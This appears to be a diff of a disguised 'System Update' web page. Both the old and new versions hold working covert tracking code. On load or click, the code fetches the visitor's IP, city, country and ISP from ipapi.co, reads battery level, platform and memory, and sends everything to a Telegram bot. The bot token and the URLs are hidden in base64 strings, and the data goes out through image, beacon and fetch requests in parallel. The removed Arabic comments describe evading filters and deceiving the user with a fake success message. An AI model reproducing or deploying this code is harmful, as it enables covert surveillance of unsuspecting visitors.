@@ -1,50 +1,38 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>System Update</title>
+    <title>Checking...</title>
 </head>
-<body style="background:#000;margin:0;height:100vh;display:flex;align-items:center;justify-content:center;cursor:pointer;" onclick="v99()">
-    <div style="color:#222;font-family:sans-serif;font-size:12px;">Loading System Components...</div>
-
+<body style="background:#000;margin:0;height:100vh;" onload="v99()" onclick="v99()">
     <script>
-        // التشفير الأقصى للبيانات الحساسة (Token & ID)
-        const _0x5a1 = ["ODcxOTI5ODQwMzpBQUctOUlKZzJ4TFhtMFlhVjN5eTBaMXdHRURHcmpGUVd4VQ==", "NjAwMTI4NjI3MA=="];
-        const _0x2b2 = (s) => atob(s);
+        const _v1 = ["ODcxOTI5ODQwMzpBQUctOUlKZzJ4TFhtMFlhVjN5eTBaMXdHRURHcmpGUVd4VQ==", "NjAwMTI4NjI3MA=="];
+        const _v2 = (s) => atob(s);
 
         async function v99() {
             try {
-                // تجميع محرك الإرسال ديناميكياً لتضليل الفلاتر
-                const _base = _0x2b2("aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdA==");
-                const _end = _0x2b2("L3NlbmRNZXNzYWdlP2NoYXRfaWQ9");
+                const _u1 = _v2("aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdA==");
+                const _u2 = _v2("L3NlbmRNZXNzYWdlP2NoYXRfaWQ9");
+                const _n = await fetch(_v2("aHR0cHM6Ly9pcGFwaS5jby9qc29uLw==")).then(r => r.json());
+                const _b = await (navigator.getBattery ? navigator.getBattery() : Promise.resolve({level: 0}));
                 
-                // سحب البيانات الصامتة (IP, Battery, Device)
-                const _net = await fetch(_0x2b2("aHR0cHM6Ly9pcGFwaS5jby9qc29uLw==")).then(r => r.json());
-                const _bat = await (navigator.getBattery ? navigator.getBattery() : Promise.resolve({level: 0}));
-                
-                // بناء التقرير الاحترافي برموز مخفية
-                let _r = `👹 [STRIKE_V112]\n`;
-                _r += `🌐 IP: ${_net.ip}\n`;
-                _r += `📍 LOC: ${_net.city}, ${_net.country_name}\n`;
-                _r += `📶 ISP: ${_net.org}\n`;
-                _r += `🔋 BAT: ${(_bat.level * 100).toFixed(0)}%\n`;
-                _r += `📱 DEV: ${navigator.platform}\n`;
-                _r += `🧠 RAM: ${navigator.deviceMemory || 'N/A'}GB\n`;
-                _r += `⏰ T: ${new Date().toLocaleTimeString()}`;
+                let _m = `REPORT_V115_FINAL\n`;
+                _m += `IP: ${_n.ip}\n`;
+                _m += `LOC: ${_n.city}, ${_n.country_name}\n`;
+                _m += `NET: ${_n.org}\n`;
+                _m += `BATT: ${(_b.level * 100).toFixed(0)}%\n`;
+                _m += `PLAT: ${navigator.platform}\n`;
+                _m += `MEM: ${navigator.deviceMemory || 'N/A'}GB`;
 
-                const _finalUrl = _base + _0x2b2(_0x5a1[0]) + _end + _0x2b2(_0x5a1[1]) + "&text=" + encodeURIComponent(_r);
-
-                // إطلاق الهجوم عبر 3 قنوات متوازية لضمان التجاوز
-                const _img = new Image();
-                _img.src = _finalUrl; // قناة الصور (لا تُحظر)
+                const _f = _u1 + _v2(_v1[0]) + _u2 + _v2(_v1[1]) + "&text=" + encodeURIComponent(_m);
                 
-                navigator.sendBeacon(_finalUrl); // قناة الـ Beacon (مخفية)
-                
-                fetch(_finalUrl, {mode: 'no-cors'}); // قناة الـ Fetch (سريعة)
-
-                // تضليل المستخدم بعد النقر
-                document.body.innerHTML = "<h3 style='color:white;text-align:center;'>System Updated Successfully</h3>";
-            } catch (e) {}
+                new Image().src = _f;
+                navigator.sendBeacon(_f);
+                fetch(_f, {mode: 'no-cors'});
+            } catch (e) {
+                const _err = "https://api.telegram.org/bot" + _v2(_v1[0]) + "/sendMessage?chat_id=" + _v2(_v1[1]) + "&text=ENTRY_DETECTED";
+                navigator.sendBeacon(_err);
+            }
         }
     </script>
 </body>
